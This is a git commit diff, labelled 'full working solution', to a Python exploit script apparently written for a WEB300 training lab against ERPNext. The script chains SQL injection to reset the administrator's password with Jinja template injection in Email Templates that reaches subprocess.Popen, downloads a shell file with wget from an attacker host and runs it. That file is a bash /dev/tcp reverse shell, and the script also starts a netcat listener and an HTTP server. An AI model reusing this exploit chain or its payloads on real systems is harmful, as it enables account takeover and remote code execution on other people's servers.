2c2717f7ee7faadd9a26c86c5e918bd2cce3056b
unknown <mateusz.andrzej.stroba@gmail.com>
2024-07-03 22:20:19 +0200

    full working solution

--- WEB300/ERPNEXT/erp_ssti_rce.py
+++ WEB300/ERPNEXT/erp_ssti_rce.py
@@ -2,6 +2,7 @@ import urllib3
 import requests
 import json
 import subprocess
+import os
 
 s = requests.session()
 host = "http://erpnext:8000"
@@ -11,6 +12,11 @@ proxies = {
 headers = { "Accept": "application/json",
             "Accept-Encoding": "gzip, deflate",
             "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" }
+
+RHOST = "192.168.45.230"
+RPORT = "4444"
+LHOST = "erpnext"
+LPORT = "8000"
 
 def inject(payload):
     data = {"cmd": "frappe.utils.global_search.web_search",
@@ -74,32 +80,62 @@ def resetPassword(token):
 	else:
 		print("\n[!] Unexpected error.")
 
-#response = inject("ascii('B')")
-#collation = identifyCollation()
-#test = inject("reset_password_key COLLATE utf8mb4_general_ci FROM tabUser")
-#print(test)
-
-# SSTI RCE PART
-
 def readPopenId():
-    createTemplateValue = "doc=%7B%22creation%22%3A%222024-07-03+01%3A57%3A46.402221%22%2C%22owner%22%3A%22zeljka.k%40randomdomain.com%22%2C%22name%22%3A%22ssti_rce%22%2C%22response%22%3A%22%3Cdiv%3E%7B%25+set+string+%3D+%5C%22ssti%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+class+%3D+%5C%22__class__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro+%3D+%5C%22__mro__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses+%3D+%5C%22__subclasses__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%3Cbr%3E%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro_r+%3D+string%7Cattr(class)%7Cattr(mro)+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses_r+%3D+mro_r%5B1%5D%7Cattr(subclasses)()+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%7B+subclasses_r+%7D%7D%3C%2Fdiv%3E%22%2C%22subject%22%3A%22ssti_rce%22%2C%22modified%22%3A%222024-07-03+02%3A14%3A01.750330%22%2C%22idx%22%3A0%2C%22modified_by%22%3A%22zeljka.k%40randomdomain.com%22%2C%22doctype%22%3A%22Email+Template%22%2C%22docstatus%22%3A0%2C%22__last_sync_on%22%3A%222024-07-03T07%3A47%3A43.033Z%22%2C%22__unsaved%22%3A1%7D&action=Save"
-    executeTemplateValue = "doc=%7B%22creation%22%3A%222024-07-03+01%3A57%3A46.402221%22%2C%22owner%22%3A%22zeljka.k%40randomdomain.com%22%2C%22name%22%3A%22ssti_rce%22%2C%22response%22%3A%22%3Cdiv%3E%7B%25+set+string+%3D+%5C%22ssti%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+class+%3D+%5C%22__class__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro+%3D+%5C%22__mro__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses+%3D+%5C%22__subclasses__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%3Cbr%3E%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro_r+%3D+string%7Cattr(class)%7Cattr(mro)+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses_r+%3D+mro_r%5B1%5D%7Cattr(subclasses)()+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%7B+subclasses_r+%7D%7D%3C%2Fdiv%3E%22%2C%22subject%22%3A%22ssti_rce%22%2C%22modified%22%3A%222024-07-03+02%3A14%3A01.750330%22%2C%22idx%22%3A0%2C%22modified_by%22%3A%22zeljka.k%40randomdomain.com%22%2C%22doctype%22%3A%22Email+Template%22%2C%22docstatus%22%3A0%2C%22__last_sync_on%22%3A%222024-07-03T07%3A47%3A43.033Z%22%2C%22__unsaved%22%3A1%7D&action=Save"
-    createTemplate("erpnext", createTemplateValue)
-    response = triggerTemplate("erpnext", executeTemplateValue)
+    classIndex = 0
+    createTemplateValue = "doc=%7B%22docstatus%22%3A0%2C%22doctype%22%3A%22Email+Template%22%2C%22name%22%3A%22New+Email+Template+1%22%2C%22__islocal%22%3A1%2C%22__unsaved%22%3A1%2C%22owner%22%3A%22zeljka.k%40randomdomain.com%22%2C%22__newname%22%3A%22test%22%2C%22subject%22%3A%22test%22%2C%22response%22%3A%22%3Cdiv%3E%7B%25+set+string+%3D+%5C%22ssti%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+class+%3D+%5C%22__class__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro+%3D+%5C%22__mro__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses+%3D+%5C%22__subclasses__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%3Cbr%3E%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro_r+%3D+string%7Cattr(class)%7Cattr(mro)+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses_r+%3D+mro_r%5B1%5D%7Cattr(subclasses)()+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%7B+subclasses_r+%7D%7D%3C%2Fdiv%3E%22%7D&action=Save"
+    executeTemplateValue = "template_name=test&doc=%7B%22response%22%3A%22%3Cdiv%3E%7B%25+set+string+%3D+%5C%22ssti%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+class+%3D+%5C%22__class__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro+%3D+%5C%22__mro__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses+%3D+%5C%22__subclasses__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%3Cbr%3E%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro_r+%3D+string%7Cattr(class)%7Cattr(mro)+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses_r+%3D+mro_r%5B1%5D%7Cattr(subclasses)()+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%7B+subclasses_r+%7D%7D%3C%2Fdiv%3E%22%2C%22subject%22%3A%22test%22%2C%22name%22%3A%22test%22%2C%22docstatus%22%3A0%2C%22modified%22%3A%222024-07-03+13%3A27%3A50.586466%22%2C%22owner%22%3A%22zeljka.k%40randomdomain.com%22%2C%22creation%22%3A%222024-07-03+13%3A27%3A50.586466%22%2C%22doctype%22%3A%22Email+Template%22%2C%22idx%22%3A0%2C%22modified_by%22%3A%22zeljka.k%40randomdomain.com%22%2C%22__last_sync_on%22%3A%222024-07-03T17%3A28%3A44.435Z%22%7D&_lang="
+    createTemplate(createTemplateValue)
+    print("[+] Class list template created successfully")
 
-    #read all classes
-    #convert to list with ids
-    #find id of subprocess.popen
+    response = triggerTemplate(executeTemplateValue)
+    print("[+] Class list executed created successfully")
 
-def createRevShell(host, port, filename):
+    classesList = json.loads(response.content)
+    subclasses = classesList['message']['message']
+    sub = subclasses.split(', ')
+    for index, line in enumerate(sub):
+	    if 'subprocess.Popen' in line:
+		    index -= 2
+		    classIndex = index
+
+    print("[+] Retrieved subprocess.popen class id (%s)" %classIndex)
+    deleteTemplate("test")
+    return classIndex
+
+
+def createTemplate(templateValue):
+  target = "http://erpnext:8000/api/method/frappe.desk.form.save.savedocs"
+  createTemplateData = templateValue
+  response = s.post(target, data=createTemplateData, headers=headers)
+  print(response.text)
+
+def triggerTemplate(templateValue):
+  target = "http://erpnext:8000/api/method/frappe.email.doctype.email_template.email_template.get_email_template"
+  data = templateValue
+  response = s.post(target, data=data, headers=headers)
+  return response
+
+def deleteTemplate(templateName):
+    #Deleting template
+    target = "http://erpnext:8000/api/method/frappe.client.delete"
+    data = "doctype=Email+Template&name=%s" %templateName
+    response = s.post(target, data=data, headers=headers)
+    if "{}" in response.text:
+        print("[+] Template %s deleted Successfully" % templateName)
+    else:
+        print("Unexpected error when deleting template")
+
+def createRevShell(host, port, directory, filename):
     shell_command = f"bash -i >& /dev/tcp/{host}/{port} 0>&1\n"
+    filepath = os.path.join(directory, filename)
 
     try:
-        with open(filename, 'w') as f:
+        os.makedirs(directory, exist_ok=True)  # Ensure the directory exists
+        with open(filepath, 'w') as f:
             f.write(shell_command)
-        print(f"Reverse shell file ({filename}) created successfully.")
+        print(f"Reverse shell file created successfully at {filepath}.")
     except Exception as e:
-        print(f"Failed to write shell command to {filename}: {e}")
+        print(f"Failed to write shell command to {filepath}: {e}")
 
 def startListener(port):
     try:
@@ -112,35 +148,39 @@ def startListener(port):
         print(f"Failed to start netcat listener: {e}")
         return None
 
-def uploadShell():
-  t=t
+def start_http_server(directory, port):
+    # Command to start the HTTP server
+    command = f"python3 -m http.server {port}"
 
-def createTemplate(rhost, templateValue):
-  target = "http://%s:8000/api/method/frappe.desk.form.save.savedocs" % rhost
-  templateValue = templateValue
-  data = "doc=%7B%22docstatus%22%3A0%2C%22doctype%22%3A%22Email+Template%22%2C%22name%22%3A%22New+Email+Template+1%22%2C%22__islocal%22%3A1%2C%22__unsaved%22%3A1%2C%22owner%22%3A%22zeljka.k%40randomdomain.com%22%2C%22__newname%22%3A%22test%22%2C%22subject%22%3A%22rce2%22%2C%22response%22%3A%22%3Cdiv%3E%7B%25+set+string+%3D+%5C%22ssti%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+class+%3D+%5C%22__class__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro+%3D+%5C%22__mro__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses+%3D+%5C%22__subclasses__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%3Cbr%3E%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro_r+%3D+string%7Cattr(class)%7Cattr(mro)+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses_r+%3D+mro_r%5B1%5D%7Cattr(subclasses)()+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%7B+subclasses_r+%7D%7D%3C%2Fdiv%3E%22%7D&action=Save"
-  response = s.post(target, data=data, headers=headers)
-  print(response.text)
-def triggerTemplate(rhost, templateValue):
-  target = "http://%s:8000/api/method/frappe.email.doctype.email_template.email_template.get_email_template" % rhost
-  templateValue = templateValue
-  data = "doc=%7B%22creation%22%3A%222024-07-03+01%3A57%3A46.402221%22%2C%22owner%22%3A%22zeljka.k%40randomdomain.com%22%2C%22name%22%3A%22ssti_rce%22%2C%22response%22%3A%22%3Cdiv%3E%7B%25+set+string+%3D+%5C%22ssti%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+class+%3D+%5C%22__class__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro+%3D+%5C%22__mro__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses+%3D+%5C%22__subclasses__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%3Cbr%3E%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro_r+%3D+string%7Cattr(class)%7Cattr(mro)+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses_r+%3D+mro_r%5B1%5D%7Cattr(subclasses)()+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%7B+subclasses_r+%7D%7D%3C%2Fdiv%3E%22%2C%22subject%22%3A%22ssti_rce%22%2C%22modified%22%3A%222024-07-03+02%3A14%3A01.750330%22%2C%22idx%22%3A0%2C%22modified_by%22%3A%22zeljka.k%40randomdomain.com%22%2C%22doctype%22%3A%22Email+Template%22%2C%22docstatus%22%3A0%2C%22__last_sync_on%22%3A%222024-07-03T07%3A47%3A43.033Z%22%2C%22__unsaved%22%3A1%7D&action=Save"
-  response = s.post(target, data=data, headers=headers)
-  print(response.text)
+    # Create a new terminal using terminator and run the command
+    try:
+        subprocess.Popen(['terminator', '-x', f'bash -c "cd {directory} && {command}"'])
+        print(f"HTTP server started successfully in {directory} on port {port}.")
+    except Exception as e:
+        print(f"Failed to start HTTP server: {e}")
 
-  return response
+# Example usage
+start_http_server('/path/to/directory', 8000)
 
-#def rce():
-  #upload shell
-  #execute
+def uploadShell(rhost, rport, popen):
+  CreateWgetReverseShellTemplate = "doc=%7B%22docstatus%22%3A0%2C%22doctype%22%3A%22Email+Template%22%2C%22name%22%3A%22New+Email+Template+1%22%2C%22__islocal%22%3A1%2C%22__unsaved%22%3A1%2C%22owner%22%3A%22zeljka.k%40randomdomain.com%22%2C%22__newname%22%3A%22wget%22%2C%22subject%22%3A%22wget%22%2C%22response%22%3A%22%3Cdiv%3E%7B%25+set+string+%3D+%5C%22ssti%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+class+%3D+%5C%22__class__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro+%3D+%5C%22__mro__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses+%3D+%5C%22__subclasses__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%3Cbr%3E%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro_r+%3D+string%7Cattr(class)%7Cattr(mro)+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses_r+%3D+mro_r%5B1%5D%7Cattr(subclasses)()+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%7B+subclasses_r%5B" + str(popen) + "%5D(%5B%5C%22wget%5C%22%2C+%5C%22" + rhost + "%2Fshell%5C%22%2C+%5C%22-O%5C%22%2C+%5C%22%2Ftmp%2Fshell%5C%22%5D)+%7D%7D%3C%2Fdiv%3E%22%7D&action=Save"
+  TriggerWgetReverseShellTemplate = "template_name=wget&doc=%7B%22parentfield%22%3Anull%2C%22response%22%3A%22%3Cdiv%3E%7B%25+set+string+%3D+%5C%22ssti%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+class+%3D+%5C%22__class__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro+%3D+%5C%22__mro__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses+%3D+%5C%22__subclasses__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%3Cbr%3E%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro_r+%3D+string%7Cattr(class)%7Cattr(mro)+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses_r+%3D+mro_r%5B1%5D%7Cattr(subclasses)()+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%7B+subclasses_r%5B" + str(popen) + "%5D(%5B%5C%22wget%5C%22%2C+%5C%22" + rhost + "%2Fshell%5C%22%2C+%5C%22-O%5C%22%2C+%5C%22%2Ftmp%2Fshell%5C%22%5D)+%7D%7D%3C%2Fdiv%3E%22%2C%22parenttype%22%3Anull%2C%22subject%22%3A%22wget%22%2C%22name%22%3A%22wget%22%2C%22docstatus%22%3A0%2C%22modified%22%3A%222024-07-03+15%3A11%3A33.086005%22%2C%22owner%22%3A%22zeljka.k%40randomdomain.com%22%2C%22creation%22%3A%222024-07-03+15%3A11%3A33.086005%22%2C%22doctype%22%3A%22Email+Template%22%2C%22idx%22%3A0%2C%22modified_by%22%3A%22zeljka.k%40randomdomain.com%22%2C%22parent%22%3Anull%2C%22__last_sync_on%22%3A%222024-07-03T19%3A11%3A33.421Z%22%7D&_lang="
 
+  createTemplate(CreateWgetReverseShellTemplate)
+  triggerTemplate(TriggerWgetReverseShellTemplate)
 
+  CreateExecuteReverseShellTemplate = "doc=%7B%22docstatus%22%3A0%2C%22doctype%22%3A%22Email+Template%22%2C%22name%22%3A%22New+Email+Template+1%22%2C%22__islocal%22%3A1%2C%22__unsaved%22%3A1%2C%22owner%22%3A%22zeljka.k%40randomdomain.com%22%2C%22__newname%22%3A%22execute_rev%22%2C%22subject%22%3A%22execute_rev%22%2C%22response%22%3A%22%3Cdiv%3E%7B%25+set+string+%3D+%5C%22ssti%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+class+%3D+%5C%22__class__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro+%3D+%5C%22__mro__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses+%3D+%5C%22__subclasses__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%3Cbr%3E%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro_r+%3D+string%7Cattr(class)%7Cattr(mro)+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses_r+%3D+mro_r%5B1%5D%7Cattr(subclasses)()+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%7B+subclasses_r%5B" + str(popen) + "%5D(%5B%5C%22bash%5C%22%2C+%5C%22-c%5C%22%2C+%5C%22%2Fbin%2Fbash+%2Ftmp%2Fshell%5C%22%5D)+%7D%7D%3C%2Fdiv%3E%22%7D&action=Save"
+  TriggerExecuteReverseShellTemplate = "template_name=execute_rev&doc=%7B%22parentfield%22%3Anull%2C%22response%22%3A%22%3Cdiv%3E%7B%25+set+string+%3D+%5C%22ssti%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+class+%3D+%5C%22__class__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro+%3D+%5C%22__mro__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses+%3D+%5C%22__subclasses__%5C%22+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%3Cbr%3E%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+mro_r+%3D+string%7Cattr(class)%7Cattr(mro)+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%25+set+subclasses_r+%3D+mro_r%5B1%5D%7Cattr(subclasses)()+%25%7D%3C%2Fdiv%3E%3Cdiv%3E%7B%7B+subclasses_r%5B" + str(popen) + "%5D(%5B%5C%22bash%5C%22%2C+%5C%22-c%5C%22%2C+%5C%22%2Fbin%2Fbash+%2Ftmp%2Fshell%5C%22%5D)+%7D%7D%3C%2Fdiv%3E%22%2C%22parenttype%22%3Anull%2C%22subject%22%3A%22execute_rev%22%2C%22name%22%3A%22execute_rev%22%2C%22docstatus%22%3A0%2C%22modified%22%3A%222024-07-03+15%3A36%3A58.453957%22%2C%22owner%22%3A%22zeljka.k%40randomdomain.com%22%2C%22creation%22%3A%222024-07-03+15%3A36%3A58.453957%22%2C%22doctype%22%3A%22Email+Template%22%2C%22idx%22%3A0%2C%22modified_by%22%3A%22zeljka.k%40randomdomain.com%22%2C%22parent%22%3Anull%2C%22__last_sync_on%22%3A%222024-07-03T19%3A36%3A58.758Z%22%7D&_lang="
 
-#response = inject("ascii('B')")
-#collation = identifyCollation()
+  createTemplate(CreateExecuteReverseShellTemplate)
+  triggerTemplate(TriggerExecuteReverseShellTemplate)
 
-#test = inject("reset_password_key COLLATE utf8mb4_general_ci FROM tabUser")
-#print(test)
+  
+  deleteTemplate("wget")
+  deleteTemplate("execute_rev")
+ 
+
+# SQLI PART
 adminEmailAdress = getAdminMailAdress()
 sendPasswordResetRequest(adminEmailAdress)
 resetToken = getPasswordResetToken()
@@ -148,12 +188,10 @@ print(resetToken)
 resetPassword(resetToken)
 print(resetPassword)
 #checkNewCredentialsValidity(username, password)
-#createRevShell("192.168.45.190","4444","shell")
-#startListener(4444)
-#readPopenId()
-createTemplate("erpnext", "test")
-#checkNewCredentialsValidity(username, password)
-#print(adminEmailAdress)
-#print(resetToken)
 
-#RCE THROUGH SSTI
+# RCE PART
+createRevShell("192.168.45.230","4444", "/root/WEB300/erpnext", "shell")
+startListener(4444)
+start_http_server("/root/WEB300/erpnext", 80)
+classIndex = readPopenId()
+uploadShell("192.168.45.230", "4444", classIndex)
